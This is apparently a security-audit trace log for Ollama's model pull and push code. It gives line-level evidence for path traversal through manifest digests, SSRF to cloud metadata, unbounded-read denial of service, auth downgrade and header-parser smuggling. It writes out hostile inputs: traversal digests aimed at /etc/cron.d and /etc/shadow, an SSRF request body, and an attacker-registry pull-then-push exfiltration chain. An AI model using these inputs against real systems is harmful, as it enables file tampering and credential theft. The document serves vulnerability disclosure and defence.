4. `server/images.go:763` -- `transfer.Download(ctx, transfer.DownloadOptions{Blobs: blobs, BaseURL: baseURL, DestDir: destDir, ...})` dispatches to the transfer package
5. `x/imagegen/transfer/download.go:43` -- `download(ctx, opts)` iterates blobs
6. `x/imagegen/transfer/download.go:57-64` -- existence+size cache-check; skipped if file absent
7. `x/imagegen/transfer/download.go:105-145` -- `d.download(ctx, blob)` retry loop; calls `d.downloadOnce(ctx, blob)` at line 118
8. `x/imagegen/transfer/download.go:158-209` -- `downloadOnce`: builds URL, resolves, then `return d.save(ctx, blob, resp.Body, existingSize)` at line 209
9. `x/imagegen/transfer/download.go:212-266` -- `save(ctx, blob, r, existingSize)`:
   - Line 213: `dest := filepath.Join(d.destDir, digestToPath(blob.Digest))`
   - Line 214: `tmp := dest + ".tmp"`
   - Line 215: `os.MkdirAll(filepath.Dir(dest), 0o755)` -- UNCONDITIONAL directory creation; runs before any integrity check
   - Line 242: `f, err = os.Create(tmp)` -- creates the `.tmp` file
   - Line 250: `n, err := d.copy(ctx, f, r, h)` -- streams bytes into file
   - Line 257: `if got := fmt.Sprintf("sha256:%x", h.Sum(nil)); got != blob.Digest` -- hash check
   - Line 258: `os.Remove(tmp)` -- removes `.tmp` on hash mismatch (CORRECTION to prior tracer entry)
   - Line 266: `return totalWritten, os.Rename(tmp, dest)` -- rename only on hash AND size match
10. `x/imagegen/transfer/transfer.go:164-170` -- `digestToPath("sha256:../../../etc/cron.d/evil")`:
    - Line 166: `if len(digest) > 7 && digest[6] == ':'` -- true for `sha256:../...`
    - Line 167: `return digest[:6] + "-" + digest[7:]` → `"sha256-../../../etc/cron.d/evil"`
    - `filepath.Join("/home/user/.ollama/models/blobs", "sha256-../../../etc/cron.d/evil")` → `/etc/cron.d/evil`

CORRECTION to prior tracer entry: the `.tmp` file at `line 258` IS removed by `save()` on hash mismatch. However:
- `os.MkdirAll(filepath.Dir(dest), 0o755)` at line 215 ALWAYS creates the intermediate directories, even when the download ultimately fails -- directory creation is a separate primitive that persists regardless
- `.tmp` persists on NETWORK ERROR (when `d.copy()` at line 250 returns an error before hash is computed); the outer `download()` at line 134-137 only calls `os.Remove(dest + ".tmp")` when `blob.Size < resumeThreshold` (64MB); for blobs >= 64MB with a network error, `.tmp` is preserved for resume -- attacker controls both the blob bytes AND the error timing by dropping the connection

Attack consequence:
- For any blob >= 64MB: attacker sends some bytes then drops connection → `copy()` errors → `save()` returns without calling `os.Remove(tmp)` → outer `download()` preserves `.tmp` because `blob.Size >= 64MB` → partial file with attacker bytes persists at `/etc/cron.d/evil.tmp`
- Alternatively (H-00.11 variant): attacker sends `size=0, digest=sha256:e3b0c4...` (sha256 of empty string) → hash MATCHES → `os.Rename(tmp, dest)` runs → clean empty file at arbitrary path

Sanitizers on path:
- `manifest/paths.go:40-60` -- `BlobsPath(digest string)`: regex `^sha256[:-][0-9a-fA-F]{64}$` validates digest; bypassable because NOT called for individual layer digests in `pullWithTransfer`; only `BlobsPath("")` at `server/images.go:730` is called to get the directory
- `x/imagegen/transfer/download.go:257-258` -- sha256 hash check + `os.Remove(tmp)`: bypassable by dropping connection before all bytes are sent (network error preserves `.tmp` for large blobs) or by using the empty-hash variant (H-00.11)
- `os.MkdirAll` is NOT a sanitizer -- it is a side-effecting sink that creates directories

CodeQL slice: call-graph-slices.json entry #1 (DFD-1-pull-digest-to-disk), reachable: true, path_count: 4. query-digest-path-no-canonicalization.json confirms edges: `selection of Digest` → `struct literal [Digest]` → `blobs [array, Digest]` → `range statement[1] [Digest]` → `call to digestToPath` → `call to Join` → `tmp` (sink MaD:2017 and MaD:2009)
On-demand query: none

**Assessment**: CONFIRMED CRITICAL. The directory-creation primitive (`os.MkdirAll` at line 215) runs unconditionally before any hash check, permanently creating the traversal path structure. The `.tmp` file persists on network error for blobs >= 64MB. The hash check in `save()` correctly removes `.tmp` on content mismatch, but cannot undo the directory creation. An attacker running a registry can serve `blob.Size=100000000` and drop the connection after sending 1 byte to guarantee `.tmp` persistence with that 1 byte of content.

---

### [TRACER] Evidence for H-00.03 -- 2026-04-17T06:32:00Z

**Reachability: REACHABLE**

Code path (exact lines):
1. `server/routes.go` `PullHandler` → `PullModel`; `regOpts.Insecure = req.Insecure` from JSON body
2. `server/images.go:597` -- `n := model.ParseName(name)` where `name = "169.254.169.254/x:latest"`
3. `types/model/name.go:344-372` -- `isValidPart(kindHost, "169.254.169.254")`:
   - `isValidLen(kindHost, s)` at line 340: `len(s) >= 1 && len(s) <= 80` -- passes (15 chars)
   - Loop at line 348: `i=0`: `isAlphanumericOrUnderscore('1')` -- `'1' >= '0' && '1' <= '9'` -- passes
   - Subsequent chars: digits and `.`; `.` at line 357: `if kind == kindNamespace { return false }` -- kindHost is not kindNamespace, so `.` PASSES
   - Result: `isValidPart` returns true for `169.254.169.254`
4. `server/images.go:615` -- `if n.ProtocolScheme == "http" && !regOpts.Insecure` -- with `regOpts.Insecure = true`, this check is bypassed; `n.ProtocolScheme` defaults to `"https"` for non-`http://`-prefixed names but the scheme for the outbound request is set by `BaseURL()` which uses the scheme from `n`
5. `server/images.go:853` -- `requestURL := n.BaseURL().JoinPath("v2", n.DisplayNamespaceModel(), "manifests", n.Tag)` -- `BaseURL()` returns `{Scheme: n.ProtocolScheme, Host: "169.254.169.254"}`; for `insecure=true` the scheme is `"http"` (enforced at line 736 of pullWithTransfer: `if base.Scheme != "http" && regOpts != nil && regOpts.Insecure { base.Scheme = "http" }`)
6. `server/images.go:858` -- `makeRequestWithRetry(ctx, http.MethodGet, requestURL, ...)` issues `GET http://169.254.169.254/v2/x/manifests/latest`
7. `server/images.go:622-623` -- error reflected: `return fmt.Errorf("pull model manifest: %s", err)` -- IMDS response body in error

Note on scheme flow: `n.BaseURL()` at `types/model/name.go:317` builds `{Scheme: n.ProtocolScheme, Host: n.Host}`. For a name like `169.254.169.254/x:latest`, `n.ProtocolScheme` is `""` (not set) which defaults to `https` in the outbound request. However: `server/images.go:736` (in pullWithTransfer, BUT this is the fast path); for the slow path that handles SSRF, `makeRequest` at `server/images.go:949-955` has: `if requestURL.Scheme != "http" && regOpts != nil && regOpts.Insecure { requestURL.Scheme = "http" }` -- this SETS the scheme to http when `Insecure=true` AND the current scheme is not already `http`. Wait -- the condition is `Scheme != "http" && Insecure` → if both true, set to `"http"`. So with `Insecure=true`, scheme becomes `"http"`. IMDS is HTTP. Confirmed reachable.

Sanitizers on path:
- `isValidPart(kindHost)`: allows `.` -- IP addresses pass
- `server/images.go:615`: insecure check bypassed when `req.Insecure = true`
- No SSRF allowlist, no RFC1918/link-local IP blocking anywhere in the call chain

CodeQL slice: flow-paths-all-severities.md `go/request-forgery` finding at `server/images.go:992` (1 finding, ERROR severity). Entry-points.json has no SSRF-specific source entry for the `model.Name.BaseURL()` path because `isValidPart` is not modeled as a RemoteFlowSource sanitizer-bypass.
On-demand query: none

**Assessment**: CONFIRMED HIGH. IP addresses (including link-local 169.254.169.254) pass `isValidPart(kindHost)`. The `Insecure:true` flag in the request body disables the HTTP scheme check. `makeRequest` at line 949-955 sets the scheme to `"http"`. A `POST /api/pull {"name":"169.254.169.254/x:latest","insecure":true}` reaches AWS/GCP/Azure IMDS and reflects the response body in error messages.

---

### [TRACER] Evidence for H-00.04 -- 2026-04-17T06:33:00Z

**Reachability: REACHABLE**

Code path (token OOM):
1. `server/images.go:890-912` -- `makeRequestWithRetry`: when `resp.StatusCode == http.StatusUnauthorized` (line 902), calls `parseRegistryChallenge(resp.Header.Get("www-authenticate"))` at line 906 and `getAuthorizationToken(ctx, challenge, requestURL.Host)` at line 907
2. `server/auth.go:53-99` -- `getAuthorizationToken`:
   - Line 54: `redirectURL, err := challenge.URL()` -- parses realm URL from attacker-controlled header
   - Line 75: `makeRequest(ctx, http.MethodGet, redirectURL, headers, nil, &registryOptions{})` -- issues GET to realm URL
   - Line 79: `defer response.Body.Close()`
   - Line 81: `body, err := io.ReadAll(response.Body)` -- NO `io.LimitReader` wrapping; attacker serves multi-GB response → OOM

Code path (manifest OOM):
1. `server/images.go:853-875` -- `pullModelManifest`:
   - Line 858: `makeRequestWithRetry(ctx, http.MethodGet, requestURL, headers, nil, regOpts)` returns `resp`
   - Line 864: `data, err := io.ReadAll(resp.Body)` -- NO `io.LimitReader`; attacker serves multi-GB manifest → OOM

Both paths confirmed via manual code inspection at HEAD. Neither `io.LimitReader` nor `http.MaxBytesReader` nor any context timeout on body read is present.

Sanitizers on path:
- `server/auth.go:60` -- realm host equality check: irrelevant to body size; same-host token endpoint can return arbitrarily large body
- No `http.DefaultClient` timeout configured in `makeRequest` (line 985-992): `c.Do(req)` with `http.DefaultClient` which has zero `ReadHeaderTimeout` and no response body timeout

CodeQL slice: call-graph-slices.json entries #8 (DFD-8-zstd-readall, reachable: false) and #13 (DFD-13-gzip-bomb-auth, reachable: false) -- both report false due to incomplete response.Body type modeling in the Go CodeQL extractor. flow-paths-all-severities.md informational note #3 explicitly states "http.MaxBytesReader -- Not seen as an active barrier in the auth response reading path (server/auth.go:81)".
On-demand query: none

**Assessment**: CONFIRMED HIGH. `server/auth.go:81` and `server/images.go:864` both call `io.ReadAll` on `http.Response.Body` with no size limit. CodeQL's false-negative is documented as an extractor limitation. Manual inspection confirms the absence at both locations. A single `POST /api/pull` can trigger both: first the token endpoint OOM (on 401), then the manifest OOM (on 200).

---

### [TRACER] Evidence for H-00.05 -- 2026-04-17T06:34:00Z

**Reachability: REACHABLE (conditional: pull then push to same model name)**

Step 1 -- manifest storage:
- `server/images.go:779-791` -- `pullWithTransfer`:
  - Line 779: `fp, err := manifest.PathForName(n)` -- validates model name syntax only; does NOT inspect manifest JSON contents
  - Line 783: `os.MkdirAll(filepath.Dir(fp), 0o755)`
  - Line 787: `os.WriteFile(fp, manifestData, 0o644)` -- `manifestData` is the raw bytes from `io.ReadAll(resp.Body)` at line 864; attacker-controlled JSON including `"digest":"sha256:../../../etc/shadow"` stored verbatim

Step 2 -- upload reads traversal path:
- `server/images.go:796-804` -- `pushWithTransfer`:
  - Line 800: `blobs[i] = transfer.Blob{Digest: layer.Digest, Size: layer.Size, From: layer.From}` -- `layer.Digest` comes from the locally-stored manifest read by the push operation; NO `manifest.BlobsPath` call
  - Line 806: `srcDir, err := manifest.BlobsPath("")` -- gets the blobs directory, does NOT validate layer digests
- `x/imagegen/transfer/upload.go:181` -- `f, err := os.Open(filepath.Join(u.srcDir, digestToPath(blob.Digest)))`
  - `digestToPath("sha256:../../../etc/shadow")` → `"sha256-../../../etc/shadow"`
  - `filepath.Join("/home/user/.ollama/models/blobs", "sha256-../../../etc/shadow")` → `/etc/shadow`
  - `os.Open("/etc/shadow")` -- opens the file; no error handling that prevents the contents from flowing into the upload body

Upload flow after open:
- `x/imagegen/transfer/upload.go:187-188` -- `return u.put(ctx, uploadURL, f, blob.Size)` -- `f` (the open file handle to `/etc/shadow`) is the body for the HTTP PUT to attacker's registry

Sanitizers on path:
- `manifest.PathForName` validates model NAME syntax, not digest charset in manifest JSON
- No digest validation at `pushWithTransfer` lines 796-804

CodeQL slice: call-graph-slices.json entry #1 (DFD-1), reachable: true. The `digestToPath` function appears as both source and transform in the download AND upload paths.
On-demand query: none

**Assessment**: CONFIRMED HIGH. The manifest stored by `pullWithTransfer` at `server/images.go:787` contains the attacker-controlled `layer.Digest` verbatim. When the victim subsequently runs `ollama push` for the same model name, `pushWithTransfer` at line 796-804 reads back that digest and `upload.go:181` opens the traversal path. The file contents are PUT to the attacker's registry. Files readable by the ollama process (SSH keys, `/etc/passwd`, application credentials) can be exfiltrated.

---

### [TRACER] Evidence for H-00.06 -- 2026-04-17T06:35:00Z

**Reachability: REACHABLE (conditional: attacker controls registry or MITM on realm URL)**

Code path:
1. `server/images.go:906` -- `challenge := parseRegistryChallenge(resp.Header.Get("www-authenticate"))` -- `resp` is from attacker-controlled registry
2. `server/images.go:1018-1026` -- `parseRegistryChallenge`: calls `getValue(authStr, "realm")` which extracts the realm string from the header
3. `server/auth.go:53-99` -- `getAuthorizationToken(ctx, challenge, originalHost)`:
   - Line 54: `redirectURL, err := challenge.URL()` → `url.Parse(r.Realm)` -- attacker sets `r.Realm = "http://registry.ollama.ai/token"`
   - Line 60: `if redirectURL.Host != originalHost` -- `"registry.ollama.ai" == "registry.ollama.ai"` → CHECK PASSES
   - Line 64: `sha256sum := sha256.Sum256(nil)` -- signing data includes request URL
   - Line 65: `data := []byte(fmt.Sprintf("%s,%s,%s", http.MethodGet, redirectURL.String(), ...))` -- `redirectURL.String()` = `"http://registry.ollama.ai/token?..."` (HTTP scheme)
   - Line 68: `signature, err := auth.Sign(ctx, data)` -- ed25519 signature over the HTTP URL
   - Line 73: `headers.Add("Authorization", signature)` -- signed header added
   - Line 75: `response, err := makeRequest(ctx, http.MethodGet, redirectURL, headers, nil, &registryOptions{})` -- issues GET to `http://registry.ollama.ai/token` with `Authorization: <ed25519-sig>` over plaintext HTTP

Critical scheme check at `server/images.go:949-955` within `makeRequest`:
```go
if requestURL.Scheme != "http" && regOpts != nil && regOpts.Insecure {
    requestURL.Scheme = "http"
}
```
This condition converts a non-HTTP scheme to HTTP only when `Insecure=true`. When `redirectURL.Scheme` is ALREADY `"http"` (attacker's realm), no conversion is needed and no rejection occurs. The `regOpts` passed at auth.go:75 is `&registryOptions{}` (empty struct, `Insecure=false`), so the condition never fires anyway -- it would only matter for the `https://` → `http://` conversion path.

Sanitizers on path:
- `server/auth.go:60` -- host equality check: bypassable, checks only `redirectURL.Host`, not `redirectURL.Scheme`
- No `scheme == "https"` assertion exists anywhere between `challenge.URL()` (line 54) and `makeRequest` (line 75)

CodeQL slice: flow-paths-all-severities.md confirms `go/request-forgery` finding at `server/images.go:992` covering the `makeRequest` HTTP client path.
On-demand query: none

**Assessment**: CONFIRMED HIGH. The host equality check at `server/auth.go:60` is the ONLY guard on the realm URL. It does not check the scheme. A registry serving `WWW-Authenticate: Bearer realm="http://registry.example.com/token"` (same host, HTTP scheme) passes the check. The ed25519-signed `Authorization` header is transmitted in plaintext. An on-path observer reads the signature.

---

### [TRACER] Evidence for H-00.07 -- 2026-04-17T06:36:00Z

**Reachability: REACHABLE**

Code path (imagegen manifest BlobPath):
1. `x/imagegen/manifest/manifest.go:51-68` -- `LoadManifest(modelName)`: calls `resolveManifestPath(modelName)` to locate the manifest file; reads and unmarshals the manifest JSON; NO digest charset validation on any field
2. `x/imagegen/manifest/manifest.go:101-104` -- `BlobPath(digest string)`:
   - `blobName := strings.Replace(digest, ":", "-", 1)` -- single char substitution, NO regex
   - `return filepath.Join(m.BlobDir, blobName)` -- direct path construction; traversal string `sha256:../../../etc/passwd` → `sha256-../../../etc/passwd` → `/etc/passwd`
3. `x/imagegen/manifest/manifest.go:135-143` -- `ReadConfig(configPath)`:
   - Line 141: `blobPath := m.BlobPath(layer.Digest)` -- arbitrary path from manifest
   - Line 142: `return os.ReadFile(blobPath)` -- reads file at traversal path; returns contents to caller
4. `x/imagegen/manifest/manifest.go:155-157` -- `OpenBlob(digest string)`:
   - Line 156: `return os.Open(m.BlobPath(digest))` -- direct open, no validation
5. `x/imagegen/manifest/manifest.go:235-260` -- `detectQuantizationFromBlobs(manifest *ModelManifest)`:
   - Line 240: `data, err := readBlobHeader(manifest.BlobPath(layer.Digest))` -- calls `readBlobHeader` with traversal path
6. `x/imagegen/manifest/manifest.go:288-307` -- `readBlobHeader(path string)`:
   - Line 289: `f, err := os.Open(path)` -- opens traversal path (e.g., `/etc/passwd`)
   - Line 295-296: `binary.Read(f, binary.LittleEndian, &headerSize)` -- interprets first 8 bytes as uint64
   - Line 297-300: `if headerSize > 1024*1024 { return nil, fmt.Errorf("header too large") }` -- this bound check runs AFTER the file is opened; does not prevent `os.Open` on the traversal path

Reachability of callers: `GetModelInfo` at line 188 is a public function that calls `LoadManifest` then `ReadConfig` then `detectQuantizationFromBlobs`. Any manifest stored on disk (via a prior pull from a malicious registry) with a traversal digest in `Config.Digest` or `Layers[*].Digest` triggers arbitrary file reads when the imagegen model is loaded for inference.

Sanitizers on path:
- `x/imagegen/manifest/manifest.go:297-300` -- `headerSize > 1024*1024` bound check: bypassable because `os.Open` succeeds first; the bound check only prevents reading beyond 1MB of the OPENED file's content, it does NOT prevent the file from being opened
- No regex validation; no `filepath.IsLocal` check

CodeQL slice: flow-paths-all-severities.md "12 more across server/ and x/imagegen/" path-injection entries confirm the imagegen manifest paths.
On-demand query: none

**Assessment**: CONFIRMED HIGH. `BlobPath` at `x/imagegen/manifest/manifest.go:101-104` is structurally identical to `digestToPath` at `x/imagegen/transfer/transfer.go:165` -- both use raw `strings.Replace`. Three read-side callers (`ReadConfig` line 141, `OpenBlob` line 156, `readBlobHeader` line 289) issue `os.ReadFile` or `os.Open` on the resulting path. A manifest with traversal digest in any layer or config field drives arbitrary file reads.

---

### [TRACER] Evidence for H-00.09 -- 2026-04-17T06:37:00Z

**Reachability: REACHABLE (when OLLAMA_EXPERIMENT=client2)**

Architecture confirmed at HEAD:
1. `server/routes.go:92-96` -- `experimentEnabled("client2")`: `strings.Split(os.Getenv("OLLAMA_EXPERIMENT"), ",")` checked for `"client2"`; `useClient2` boolean set at init
2. `server/routes.go:1789-1796` -- `Serve()`: `if useClient2 { rc, err = ollama.DefaultRegistry() }` -- `rc != nil` when client2 enabled
3. `server/routes.go:1735-1744` -- `GenerateRoutes(rc)`: when `rc != nil`:
   ```go
   rs := &registry.Local{
       Client:   rc,
       Logger:   slog.Default(),
       Fallback: r,  // r is the gin router with allowedHostsMiddleware
       Prune: PruneLayers,
   }
   return rs, nil
   ```
   `rs` (not `r`) is returned as the top-level HTTP handler
4. `server/routes.go:1803` -- `http.Handle("/", h)` where `h = rs` -- all requests go to `registry.Local.ServeHTTP`
5. `server/internal/registry/server.go:114-128` -- `serveHTTP(rec, r)`:
   ```go
   switch r.URL.Path {
   case "/api/delete": return false, s.handleDelete(rec, r)
   case "/api/pull":   return false, s.handlePull(rec, r)
   default:
       if s.Fallback != nil { s.Fallback.ServeHTTP(rec, r); return true, nil }
   ```
   `/api/pull` and `/api/delete` are handled BEFORE `s.Fallback.ServeHTTP` (gin) is called
6. `server/routes.go:1674-1678` -- gin router `r` has `allowedHostsMiddleware(s.addr)` registered at line 1678; but gin is ONLY reached via `Fallback` for paths NOT matching `/api/pull` or `/api/delete`
7. `server/internal/registry/server.go:259-264` -- `handlePull`:
   ```go
   p, err := decodeUserJSON[*params](r.Body)
   ```
   `r.Body` has NO `http.MaxBytesReader` wrapper applied
8. `server/internal/registry/server.go:377-399` -- `decodeUserJSON[T]`:
   ```go
   err := json.NewDecoder(r).Decode(&v)
   ```
   Reads from `r` (the `io.Reader` = `r.Body`) without any size limit

Security implications of this architecture:
- **DNS rebinding bypass**: `allowedHostsMiddleware` at `server/routes.go:1608` checks the incoming request's `Host` header against `allowedHosts`. When `registry.Local` handles the request directly, the gin middleware chain (including `allowedHostsMiddleware`) is NEVER invoked. An attacker who has performed DNS rebinding can access `/api/pull` and `/api/delete` endpoints without triggering the rebinding protection.
- **Unbounded body**: `decodeUserJSON` at line 264 reads the request body with no size limit.

Sanitizers on path:
- `allowedHostsMiddleware`: bypassable because it is registered on the gin router but gin is only reached as a `Fallback` for paths not handled by `registry.Local`
- Gin default body size: same bypass

CodeQL slice: entry-points.json shows `server/internal/registry/server.go:264` as `selection of Body` remote flow source (confirmed as attacker-controlled data entering the system).
On-demand query: none

**Assessment**: CONFIRMED MEDIUM. When `OLLAMA_EXPERIMENT=client2` is set, `registry.Local` intercepts `/api/pull` and `/api/delete` before gin middleware runs. Both `allowedHostsMiddleware` (DNS rebinding protection) and any gin body-size limits are bypassed. The unbounded body OOM via `decodeUserJSON` at line 264 requires sending a multi-GB JSON body. The DNS rebinding bypass is the more significant issue as it removes a defense-in-depth layer for unauthenticated localhost API access.

---

### [TRACER] Evidence for H-00.13 -- 2026-04-17T06:38:00Z

**Reachability: PARTIAL (parser bug real; controlled bypass narrow)**

Code path:
1. `server/images.go:906` -- `challenge := parseRegistryChallenge(resp.Header.Get("www-authenticate"))` where `resp` comes from attacker-controlled registry
2. `server/images.go:1018-1026` -- `parseRegistryChallenge`:
   ```go
   return registryChallenge{
       Realm:   getValue(authStr, "realm"),
       Service: getValue(authStr, "service"),
       Scope:   getValue(authStr, "scope"),
   }
   ```
3. `server/images.go:995-1016` -- `getValue(header, key)`:
   - Line 996: `startIdx := strings.Index(header, key+"=")` -- finds FIRST occurrence of `key=` anywhere in `header`
   - Line 1002: `startIdx += len(key) + 2` -- advances past `key=` and the ASSUMED opening `"` character (unconditional +2)
   - Lines 1005-1014: loop until `"` is found; on `"` char at `endIdx`:
     - If `endIdx+1 < len(header) && header[endIdx+1] != ','`: CONTINUE scanning (advance past the embedded `"`)
     - Otherwise (next char IS `,` or end of string): BREAK
   - Line 1015: `return header[startIdx:endIdx]`

Vulnerability analysis -- scope/service smuggling via realm value:

Attack header:
```
Bearer realm="https://registry.example.com/v2/token?service=EVIL_SVC&scope=EVIL_SCOPE",service="legitimate.io",scope="repository:foo:pull"
```

- `getValue(h, "realm")` -- `startIdx = index("realm=") + len("realm") + 2` = position after `realm="`, pointing at `h`; loop scans until first `"` followed by `,`; the realm value contains no `"` until the closing `"` before `,service=`; that `"` IS followed by `,` → break; returns `https://registry.example.com/v2/token?service=EVIL_SVC&scope=EVIL_SCOPE` (CORRECT realm)
- `getValue(h, "service")` -- `strings.Index(h, "service=")` finds FIRST occurrence of `"service="` in the ENTIRE header string; the FIRST occurrence is INSIDE the realm value: `...?service=EVIL_SVC...`; `startIdx` is set to position after `service="` inside the realm query string; loop scans until `"` followed by `,`; finds `"` before `scope=EVIL_SCOPE",service=...`; returns `EVIL_SVC&` (truncated at `"`) -- wait, let me re-examine

Actually the realm query string is `service=EVIL_SVC&scope=EVIL_SCOPE` (no embedded `"`). The loop scans until it hits `"` -- the first `"` encountered after the inner `service=` is the closing `"` of the realm value itself (before `,service=`). That `"` is followed by `,` → break. So `getValue(h, "service")` returns `EVIL_SVC&scope=EVIL_SCOPE` (everything from after `service="` inside realm to the closing `"`).

- `getValue(h, "scope")` -- similarly, `strings.Index(h, "scope=")` finds FIRST occurrence inside realm (`scope=EVIL_SCOPE"`); returns `EVIL_SCOPE` (terminates at the `"` before `,service=...`)

So `registryChallenge{Realm: "https://registry.example.com/v2/token?service=EVIL_SVC&scope=EVIL_SCOPE", Service: "EVIL_SVC&scope=EVIL_SCOPE", Scope: "EVIL_SCOPE"}`.

Downstream flow:
- `server/auth.go:33-48` -- `challenge.URL()`: adds `service` and `scope` as query params to the realm URL
  - The realm URL ALREADY contains `service=EVIL_SVC&scope=EVIL_SCOPE` as query parameters (from the realm value itself)
  - `values.Add("service", "EVIL_SVC&scope=EVIL_SCOPE")` adds a SECOND `service` param
  - Final URL: `https://registry.example.com/v2/token?service=EVIL_SVC&scope=EVIL_SCOPE&service=EVIL_SVC%26scope%3DEVIL_SCOPE&scope=EVIL_SCOPE&ts=...&nonce=...`
  - The token endpoint receives attacker-controlled `service` and `scope` values as query params

- `server/auth.go:65` -- signed data: `fmt.Sprintf("%s,%s,%s", http.MethodGet, redirectURL.String(), ...)` -- `redirectURL.String()` is `https://registry.example.com/v2/token?...` (the complete URL with attacker-controlled query params); the victim's ed25519 signature is over this URL

- `server/auth.go:60` -- host check: `redirectURL.Host = "registry.example.com" == originalHost` -- CHECK PASSES (realm host is the legitimate registry host)

Attack result: victim's signed token request asks for attacker-chosen scope. If the token server grants based on requested scope without enforcing per-user entitlements, victim's signature authorizes access to `EVIL_SCOPE` resources. At minimum, signature confusion: victim unknowingly signs for attacker scope.

Sanitizers on path:
- `server/auth.go:60` -- realm host equality check: not bypassed in this attack (realm host is legitimate); provides no protection against scope smuggling
- No scope/service value validation anywhere in the auth chain

CodeQL slice: spec-gap-report.md Gap 13 explicitly documents this parser flaw at `server/images.go:995-1026`.
On-demand query: none

**Assessment**: CONFIRMED PARTIAL (scope smuggling real, direct host bypass not achieved). The `strings.Index` substring-matching at `server/images.go:996` finds the FIRST occurrence of `service=` or `scope=` anywhere in the header, including inside the realm value. An attacker who embeds `service=EVIL&scope=EVIL` inside the realm query string causes the parsed `Service` and `Scope` fields to contain attacker-chosen values. These flow into the signed token request URL, binding the victim's signature to attacker-chosen scope. The host equality check (line 60) is not bypassed. Severity: HIGH for parser design flaw; exploit depends on token server scope policy.

---

### [TRACER] Evidence for H-02 -- 2026-04-17T06:39:00Z

**Reachability: REACHABLE (conditional: pull then push)**

This extends H-00.05 with the full pull-to-push chain evidence:

Pull step -- manifest persistence:
1. `server/images.go:858-874` -- `pullModelManifest`: `io.ReadAll(resp.Body)` stores raw attacker JSON bytes in `manifestData`; `json.Unmarshal(data, &m)` unmarshals into `manifest.Manifest` struct; `Layer.Digest` field accepts any string value
2. `server/images.go:787` -- `os.WriteFile(fp, manifestData, 0o644)` -- raw bytes stored verbatim; `fp` is validated for model name syntax only via `manifest.PathForName(n)` at line 779

Push step -- file exfiltration:
1. `server/images.go:529-547` (via `PushModel`) -- reads stored manifest via `ParseNamedManifest`; no digest validation; copies raw `layer.Digest` into push layers
2. `server/images.go:796-804` -- `blobs[i] = transfer.Blob{Digest: layer.Digest, ...}` -- traversal digest persists
3. `x/imagegen/transfer/upload.go:170-188` -- `uploadOnce`:
   - Line 181: `f, err := os.Open(filepath.Join(u.srcDir, digestToPath(blob.Digest)))` -- opens `/etc/shadow` (or any readable path)
   - Line 187-188: `return u.put(ctx, uploadURL, f, blob.Size)` -- streams file contents to attacker registry via HTTP PUT

Chain execution requires: (1) victim pulls `evil.com/model:tag` (writes malicious manifest to disk), (2) victim pushes `evil.com/model:tag` (or any push of that model name to any registry including their own). Both are normal user-facing operations. CI/CD mirror pipelines routinely pull then push. The attacker needs the victim to make BOTH API calls.

No sanitizer exists between manifest read (step 1) and file open (step 2) that validates layer digests.

CodeQL slice: call-graph-slices.json entry #1 (DFD-1), reachable: true. Upload path mirrors download path for `digestToPath` function.
On-demand query: none

**Assessment**: CONFIRMED HIGH (standalone) / CRITICAL (chained per Synthesizer verdict H-02). The chain is mechanically complete: malicious manifest stored verbatim at step 1; `upload.go:181` opens arbitrary file at step 2. No digest sanitization between the two steps.

---

### [TRACER] Summary -- Exact Line References for Synthesizer's VALID Findings

| Finding ID | Verdict | Primary Vulnerable Code | Key Lines |
|------------|---------|-------------------------|-----------|
| H-00.01 (p8-001) | VALID CRITICAL | `digestToPath` + `filepath.Join` + `os.MkdirAll` + `os.Create` | `server/images.go:722-728`, `x/imagegen/transfer/transfer.go:164-170`, `x/imagegen/transfer/download.go:213-215,242` |
| H-00.03 (p8-002) | VALID HIGH | `isValidPart` permits IP; `makeRequest` SSRF | `types/model/name.go:344-372`, `server/images.go:615,853-858,949-955` |
| H-00.04 (p8-003) | VALID HIGH | `io.ReadAll` unbounded x2 | `server/images.go:864`, `server/auth.go:81` |
| H-00.05 (p8-004) | VALID HIGH | `os.Open` at traversal path in upload | `x/imagegen/transfer/upload.go:181`, `server/images.go:787,796-804` |
| H-00.06 (p8-005) | VALID HIGH | realm scheme not checked | `server/auth.go:53-75` (no scheme check at line 60) |
| H-00.07 (p8-006) | VALID HIGH | `BlobPath` raw `strings.Replace` | `x/imagegen/manifest/manifest.go:101-104,141,156,240,288-289` |
| H-00.08 (p8-007) | VALID HIGH | x/create same pattern | `x/imagegen/manifest/manifest.go:BlobPath` (per prior tracer) |
| H-00.09 (p8-008) | VALID MEDIUM | `decodeUserJSON` unbounded; middleware bypass | `server/internal/registry/server.go:114-128,264`, `server/routes.go:1735-1744` |
| H-00.10 (p8-009) | VALID MEDIUM | `downloadChunk` no 206 check | `server/download.go:338,345` |
| H-00.12 (p8-010) | VALID MEDIUM | `resp.Location()` no scheme check | `server/download.go:265-268,287` |
| H-00.13 (p8-011) | VALID HIGH | `getValue` first-match substring | `server/images.go:995-1016` |
| H-02 (p8-012) | VALID CRITICAL | pull-then-push chain | `server/images.go:787,796-804`, `x/imagegen/transfer/upload.go:181` |
| H-04 (p8-013) | VALID MEDIUM | cache-hit on bare stat | `server/download.go:478-491`, `server/images.go:652,658` |
| H-06 (p8-014) | VALID MEDIUM | no server nonce in signing | `api/client.go` (design gap) |


---

## Chamber Summary

| Hypothesis | Verdict | Severity | Finding Draft |
|-----------|---------|----------|---------------|
| H-00.01 | VALID | CRITICAL | p8-001-pullwithtransfer-digest-path-traversal.md |
| H-00.02 | DUPLICATE (→ H-04) | -- | -- |
| H-00.03 | VALID | HIGH | p8-002-api-pull-ssrf.md |
| H-00.04 | VALID | HIGH | p8-003-manifest-token-oom.md |
| H-00.05 | VALID | HIGH | p8-004-pushwithtransfer-traversal-read.md |
| H-00.06 | VALID | HIGH | p8-005-realm-http-downgrade.md |
| H-00.07 | VALID | HIGH | p8-006-imagegen-blobpath-traversal.md |
| H-00.08 | VALID | HIGH | p8-007-xcreate-blobpath-traversal.md |
| H-00.09 | VALID | MEDIUM | p8-008-client2-unbounded-body.md |
| H-00.10 | VALID | MEDIUM | p8-009-content-range-not-validated.md |
| H-00.11 | DUPLICATE (→ H-00.01) | -- | -- |
| H-00.12 | VALID | MEDIUM | p8-010-cdn-scheme-downgrade.md |
| H-00.13 | VALID | HIGH | p8-011-wwwauth-parser-smuggle.md |
| H-01 | FALSE POSITIVE | -- | -- |
| H-02 | VALID | CRITICAL | p8-012-ssrf-push-chain-full-egress.md |
| H-03 | DUPLICATE (→ H-00.13) | -- | -- |
| H-04 | VALID | MEDIUM | p8-013-cache-hit-no-hash-verify.md |
| H-05 | FALSE POSITIVE | -- | -- |
| H-06 | VALID | MEDIUM | p8-014-session-replay-no-nonce.md |
| H-07 | DUPLICATE (→ H-00.12) | -- | -- |

